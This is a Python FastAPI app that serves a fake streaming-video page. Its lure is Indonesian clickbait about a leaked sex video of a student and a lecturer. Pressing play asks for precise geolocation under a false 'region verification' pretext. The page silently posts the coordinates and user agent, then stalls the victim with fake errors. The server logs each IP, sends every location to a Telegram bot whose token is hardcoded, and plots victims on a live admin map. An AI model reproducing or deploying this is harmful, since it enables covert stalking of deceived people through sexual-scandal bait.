import json
import os
from datetime import datetime
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, FileResponse
import httpx
import uvicorn

app = FastAPI(title="GPS Telemetry Receiver")

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8791673811:AAGwPYv0hrGZGqarZA9w7_KOrUruGelViro")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "@imFreed0mLocationTest")

# In-memory storage for received location logs
location_logs = []

LANDING_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player - Streaming</title>

    <!-- Open Graph / WhatsApp Preview -->
    <meta property="og:type" content="video.other">
    <meta property="og:url" content="https://doodstream-com-full-durasi-mahasiswi-semarang-dosen-73zdc8254.vercel.app/">
    <meta property="og:title" content="VIDEO MAHASISWI SEMARANG MAIN SAMA DOSEN">
    <meta property="og:description" content="BOCOR!!! Full durasi Mahasiswi semarang main sama dosen - doodstream 18+">
    <meta property="og:image" content="https://doodstream-com-full-durasi-mahasiswi-semarang-dosen-73zdc8254.vercel.app/test.jpg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="VIDEO MAHASISWI SEMARANG MAIN SAMA DOSEN">
    <meta name="twitter:description" content="BOCOR!!! Full durasi Mahasiswi semarang main sama dosen - doodstream 18+">
    <meta name="twitter:image" content="https://doodstream-com-full-durasi-mahasiswi-semarang-dosen-73zdc8254.vercel.app/test.jpg">

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f0f0f; color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
        .player-wrapper { width: 100%%; max-width: 640px; margin: 0 auto; }
        .video-container { position: relative; width: 100%%; aspect-ratio: 16/9; background: #000; overflow: hidden; }
        .video-container img.thumbnail { display: block; position: absolute; inset: 0; width: 100%%; height: 100%%; object-fit: cover; filter: blur(12px) brightness(0.5); transition: filter 0.5s; }
        .video-container.unlocked img.thumbnail { filter: blur(4px) brightness(0.7); }
        .play-overlay { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; z-index: 2; }
        .play-overlay .play-circle { width: 72px; height: 72px; background: rgba(255,0,0,0.85); border-radius: 50%%; display: flex; align-items: center; justify-content: center; transition: transform 0.2s, background 0.2s; }
        .play-overlay .play-circle:hover { transform: scale(1.1); background: rgba(255,0,0,1); }
        .play-overlay .play-circle svg { width: 32px; height: 32px; fill: #fff; margin-left: 4px; }
        .play-overlay .lock-text { margin-top: 14px; font-size: 13px; color: rgba(255,255,255,0.85); background: rgba(0,0,0,0.6); padding: 6px 14px; border-radius: 20px; display: flex; align-items: center; gap: 6px; }
        .play-overlay .lock-text svg { width: 14px; height: 14px; fill: currentColor; }
        .duration-badge { position: absolute; bottom: 8px; right: 8px; background: rgba(0,0,0,0.8); color: #fff; font-size: 12px; font-weight: 600; padding: 2px 6px; border-radius: 4px; z-index: 1; }
        .buffering-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.6); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 3; pointer-events: none; }
        .buffering-overlay.active { display: flex; pointer-events: auto; }
        .spinner { width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.2); border-top-color: #ff0000; border-radius: 50%%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .buffering-overlay p { margin-top: 12px; font-size: 13px; color: rgba(255,255,255,0.7); }
        .progress-bar { width: 100%%; height: 4px; background: #333; position: relative; }
        .progress-bar .filled { height: 100%%; width: 0%%; background: #ff0000; transition: width 0.3s; }
        .controls-bar { width: 100%%; background: #181818; padding: 8px 12px; display: flex; align-items: center; gap: 12px; font-size: 13px; color: #aaa; }
        .controls-bar svg { width: 20px; height: 20px; fill: #fff; cursor: pointer; }
        .controls-bar .time { font-variant-numeric: tabular-nums; }
        .video-info { width: 100%%; max-width: 640px; padding: 16px; }
        .video-info h1 { font-size: 17px; font-weight: 600; line-height: 1.4; margin-bottom: 6px; }
        .video-info .meta { font-size: 13px; color: #aaa; display: flex; gap: 8px; align-items: center; }
        .video-info .meta .dot { width: 3px; height: 3px; background: #aaa; border-radius: 50%%; }
        .toast { position: fixed; bottom: 20px; left: 50%%; transform: translateX(-50%%); background: #323232; color: #fff; padding: 10px 20px; border-radius: 8px; font-size: 13px; opacity: 0; transition: opacity 0.3s; pointer-events: none; z-index: 100; }
        .toast.show { opacity: 1; }
        .error-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.85); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 4; pointer-events: none; }
        .error-overlay.active { display: flex; pointer-events: auto; }
        .error-overlay svg { width: 48px; height: 48px; fill: #ff4444; margin-bottom: 12px; }
        .error-overlay p { font-size: 14px; color: #ccc; text-align: center; max-width: 300px; line-height: 1.5; }
        .error-overlay button { margin-top: 16px; background: #ff0000; color: #fff; border: none; padding: 10px 24px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; }
        .error-overlay button:disabled { background: #555; cursor: not-allowed; }
        .countdown { font-size: 28px; font-weight: 700; color: #ff4444; margin: 12px 0 4px; font-variant-numeric: tabular-nums; }
        .countdown-label { font-size: 12px; color: #888; margin-bottom: 8px; }
        .refresh-hint { margin-top: 14px; font-size: 12px; color: #aaa; display: flex; align-items: center; gap: 6px; }
        .refresh-hint svg { width: 14px; height: 14px; fill: #aaa; animation: spin 2s linear infinite; }
    </style>
</head>
<body>
<div class="player-wrapper">
    <div class="video-container" id="videoContainer">
        <img class="thumbnail" src="/test.jpg" alt="Video thumbnail">
        <span class="duration-badge">12:47</span>
        <div class="play-overlay" id="playOverlay">
            <div class="play-circle">
                <svg viewBox="0 0 24 24"><polygon points="5,3 19,12 5,21"/></svg>
            </div>
            <span class="lock-text">
                <svg viewBox="0 0 24 24"><path d="M12 1C8.676 1 6 3.676 6 7v2H4v14h16V9h-2V7c0-3.324-2.676-6-6-6zm0 2c2.276 0 4 1.724 4 4v2H8V7c0-2.276 1.724-4 4-4zm0 10c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2z"/></svg>
                Tap to allow access &amp; play
            </span>
        </div>
        <div class="buffering-overlay" id="bufferingOverlay">
            <div class="spinner"></div>
            <p id="bufferText">Loading video...</p>
        </div>
        <div class="error-overlay" id="errorOverlay">
            <svg viewBox="0 0 24 24" id="errorIcon"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
            <p id="errorText"></p>
            <div class="countdown" id="countdownDisplay" style="display:none;">0:00</div>
            <div class="countdown-label" id="countdownLabel" style="display:none;">before retry is available</div>
            <button id="retryBtn" style="display:none;">Retry</button>
            <div class="refresh-hint" id="refreshHint" style="display:none;">
                <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0112 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
                Refresh this page to continue
            </div>
        </div>
    </div>
    <div class="progress-bar"><div class="filled" id="progressFill"></div></div>
    <div class="controls-bar">
        <svg viewBox="0 0 24 24"><polygon points="5,3 19,12 5,21"/></svg>
        <span class="time"><span id="currentTime">0:00</span> / 12:47</span>
        <div style="flex:1"></div>
        <svg viewBox="0 0 24 24"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02z" fill="#fff"/></svg>
        <svg viewBox="0 0 24 24"><path d="M7 14H5v5h5v-2H7v-3zm-2-4h2V7h3V5H5v5zm12 7h-3v2h5v-5h-2v3zM14 5v2h3v3h2V5h-5z" fill="#fff"/></svg>
    </div>
    <div class="video-info">
        <h1>VIDEO MAHASISWI SEMARANG MAIN SAMA DOSEN</h1>
        <div class="meta">
            <span>2.4M views</span>
            <span class="dot"></span>
            <span>3 hours ago</span>
        </div>
    </div>
</div>
<div class="toast" id="toast"></div>

<script>
(function() {
    'use strict';

    var WAIT_FIRST = 2 * 60;
    var WAIT_SUBSEQUENT = 7 * 60;
    var STORAGE_KEY = 'vp_state';

    var countdownTimer = null;
    var actionLocked = false;

    var playOverlay = document.getElementById('playOverlay');
    var bufferingOverlay = document.getElementById('bufferingOverlay');
    var bufferText = document.getElementById('bufferText');
    var errorOverlay = document.getElementById('errorOverlay');
    var errorIcon = document.getElementById('errorIcon');
    var errorText = document.getElementById('errorText');
    var countdownDisplay = document.getElementById('countdownDisplay');
    var countdownLabel = document.getElementById('countdownLabel');
    var retryBtn = document.getElementById('retryBtn');
    var refreshHint = document.getElementById('refreshHint');
    var videoContainer = document.getElementById('videoContainer');

    function saveState(obj) {
        try { localStorage.setItem(STORAGE_KEY, JSON.stringify(obj)); } catch(e) {}
    }
    function loadState() {
        try { var s = localStorage.getItem(STORAGE_KEY); return s ? JSON.parse(s) : null; } catch(e) { return null; }
    }

    function hideAll() {
        playOverlay.style.display = 'none';
        bufferingOverlay.classList.remove('active');
        errorOverlay.classList.remove('active');
        countdownDisplay.style.display = 'none';
        countdownLabel.style.display = 'none';
        retryBtn.style.display = 'none';
        refreshHint.style.display = 'none';
        if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
    }

    function showInitial() {
        hideAll();
        playOverlay.style.display = '';
        videoContainer.classList.remove('unlocked');
    }

    function showWait(waitEndTime) {
        hideAll();
        videoContainer.classList.remove('unlocked');
        errorOverlay.classList.add('active');
        errorIcon.style.display = '';
        errorText.textContent = 'Playback server error. Please wait and try again.';
        countdownDisplay.style.display = '';
        countdownLabel.style.display = '';
        retryBtn.style.display = '';
        retryBtn.disabled = true;
        retryBtn.textContent = 'Please wait...';

        function tick() {
            var now = Date.now();
            var remaining = Math.max(0, Math.ceil((waitEndTime - now) / 1000));
            var m = Math.floor(remaining / 60);
            var s = remaining %% 60;
            countdownDisplay.textContent = m + ':' + (s < 10 ? '0' : '') + s;
            if (remaining <= 0) {
                clearInterval(countdownTimer);
                countdownTimer = null;
                showRetryAvailable();
            }
        }
        tick();
        countdownTimer = setInterval(tick, 1000);
    }

    function showRetryAvailable() {
        countdownDisplay.textContent = '0:00';
        countdownLabel.textContent = 'Ready to retry';
        retryBtn.disabled = false;
        retryBtn.textContent = 'Retry Playback';
    }

    function showFakeVideo() {
        hideAll();
        videoContainer.classList.add('unlocked');
        bufferingOverlay.classList.add('active');
        bufferText.textContent = 'Buffering video...';
        var msgs = ['Buffering video...', 'Connecting to CDN...', 'Loading stream data...', 'Buffering video...'];
        var i = 0;
        countdownTimer = setInterval(function() {
            i = (i + 1) %% msgs.length;
            bufferText.textContent = msgs[i];
        }, 3000);
    }

    function showRefreshRequired() {
        hideAll();
        videoContainer.classList.add('unlocked');
        errorOverlay.classList.add('active');
        errorIcon.style.display = 'none';
        errorText.textContent = 'Stream interrupted. A page refresh is required to reconnect to the server.';
        refreshHint.style.display = '';
    }

    function handleInitialPlay() {
        if (actionLocked) return;
        actionLocked = true;

        hideAll();
        bufferingOverlay.classList.add('active');
        bufferText.textContent = 'Verifying your region...';

        if (!navigator.geolocation) {
            transitionToFailed();
            return;
        }

        navigator.geolocation.getCurrentPosition(
            function(position) {
                bufferText.textContent = 'Region verified. Loading stream...';

                var payload = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading,
                    timestamp: new Date(position.timestamp).toISOString(),
                    user_agent: navigator.userAgent
                };
                try {
                    fetch('/api/telemetry', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    }).catch(function() {});
                } catch (e) {}

                setTimeout(function() {
                    bufferText.textContent = 'Connecting to CDN node...';
                    setTimeout(function() { transitionToFailed(); }, 1500);
                }, 2000);
            },
            function() { transitionToFailed(); },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    }

    function transitionToFailed() {
        actionLocked = false;
        var waitEnd = Date.now() + (WAIT_FIRST * 1000);
        saveState({ phase: 'WAIT', waitEnd: waitEnd, cycle: 0 });
        showWait(waitEnd);
    }

    function handleRetry() {
        if (actionLocked) return;
        actionLocked = true;
        var state = loadState();
        var cycle = state ? (state.cycle || 0) : 0;
        saveState({ phase: 'FAKE_VIDEO', cycle: cycle + 1 });
        showFakeVideo();
        setTimeout(function() {
            actionLocked = false;
            saveState({ phase: 'REFRESH_REQUIRED', cycle: cycle + 1 });
            showRefreshRequired();
        }, 8000);
    }

    playOverlay.addEventListener('click', handleInitialPlay);
    retryBtn.addEventListener('click', function() {
        if (!retryBtn.disabled) handleRetry();
    });

    function init() {
        var state = loadState();
        if (!state) { showInitial(); return; }

        switch (state.phase) {
            case 'WAIT':
                showWait(state.waitEnd);
                break;
            case 'FAKE_VIDEO':
            case 'REFRESH_REQUIRED':
                var waitEnd7 = Date.now() + (WAIT_SUBSEQUENT * 1000);
                var cycle = state.cycle || 1;
                saveState({ phase: 'WAIT', waitEnd: waitEnd7, cycle: cycle });
                showWait(waitEnd7);
                break;
            default:
                showInitial();
        }
    }
    init();
})();
</script>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - Live Location Monitor</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { margin: 0; padding: 0; font-family: sans-serif; display: flex; flex-direction: column; height: 100vh; }
        header { background: #1f2937; color: white; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; }
        #map { flex: 1; width: 100%; }
        #logs { height: 150px; overflow-y: auto; background: #111827; color: #10b981; font-family: monospace; font-size: 12px; padding: 10px; }
    </style>
</head>
<body>
    <header>
        <h3>Live GPS Receiver Admin Dashboard</h3>
        <span id="log-count">Pings Received: 0</span>
    </header>
    <div id="map"></div>
    <div id="logs">Waiting for incoming telemetry...</div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        const map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
        let markers = [];

        async function fetchLogs() {
            try {
                const res = await fetch('/api/logs');
                const data = await res.json();
                document.getElementById('log-count').innerText = `Pings Received: ${data.length}`;
                
                if (data.length > 0) {
                    const logsDiv = document.getElementById('logs');
                    logsDiv.innerHTML = data.map(l => `[${l.received_at}] IP: ${l.client_ip} | Lat: ${l.latitude}, Lng: ${l.longitude} (Acc: ${l.accuracy}m)`).join('<br>');
                    
                    const latest = data[data.length - 1];
                    markers.forEach(m => map.removeLayer(m));
                    markers = [];

                    const marker = L.marker([latest.latitude, latest.longitude])
                        .addTo(map)
                        .bindPopup(`<b>Latest Ping</b><br>Accuracy: ${latest.accuracy}m<br>Time: ${latest.received_at}`)
                        .openPopup();
                    markers.push(marker);

                    map.setView([latest.latitude, latest.longitude], 16);
                }
            } catch (e) {
                console.error("Fetch error", e);
            }
        }

        setInterval(fetchLogs, 3000);
        fetchLogs();
    </script>
</body>
</html>
"""

async def send_telegram_alert(telemetry: dict):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[!] Telegram credentials not configured. Skipping alert.")
        return

    lat = telemetry.get("latitude")
    lng = telemetry.get("longitude")
    acc = telemetry.get("accuracy")
    ip = telemetry.get("client_ip")
    timestamp = telemetry.get("received_at")
    ua = telemetry.get("user_agent", "Unknown")

    message = (
        f"🚨 *NEW GEOLOCATION TELEMETRY*\n\n"
        f"📍 *Coords:* `{lat}, {lng}`\n"
        f"🎯 *Accuracy:* ~{acc} meters\n"
        f"🌐 *IP:* `{ip}`\n"
        f"📱 *User-Agent:* `{ua}`\n"
        f"🕒 *Time:* {timestamp}\n\n"
        f"🗺️ [Open in Google Maps](https://www.google.com/maps?q={lat},{lng})"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "disable_web_page_preview": False
    }

    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(url, json=payload, timeout=10.0)
            if response.status_code == 200:
                print(f"[+] Telegram alert sent successfully to chat_id {TELEGRAM_CHAT_ID}.")
            else:
                print(f"[-] Telegram API returned status {response.status_code}: {response.text}")
        except Exception as e:
            print(f"[-] Failed to send Telegram alert: {e}")

@app.get("/", response_class=HTMLResponse)
async def landing_page():
    return LANDING_HTML

@app.get("/test.jpg")
async def get_test_image():
    return FileResponse("test.jpg")

@app.get("/admin", response_class=HTMLResponse)
async def admin_page():
    return ADMIN_HTML

@app.post("/api/telemetry")
async def receive_telemetry(request: Request):
    client_ip = request.client.host if request.client else "Unknown"
    data = await request.json()
    data["client_ip"] = client_ip
    data["received_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    location_logs.append(data)
    
    print(f"\n[!] INCOMING GPS FIX: Lat {data.get('latitude')}, Lng {data.get('longitude')} (Accuracy: {data.get('accuracy')}m) from IP {client_ip}")
    
    # Asynchronously dispatch Telegram alert
    await send_telegram_alert(data)
    
    return {"status": "success"}

@app.get("/api/logs")
async def get_logs():
    return location_logs

if __name__ == "__main__":
    uvicorn.run("app:app", host="0.0.0.0", port=8000, reload=False)
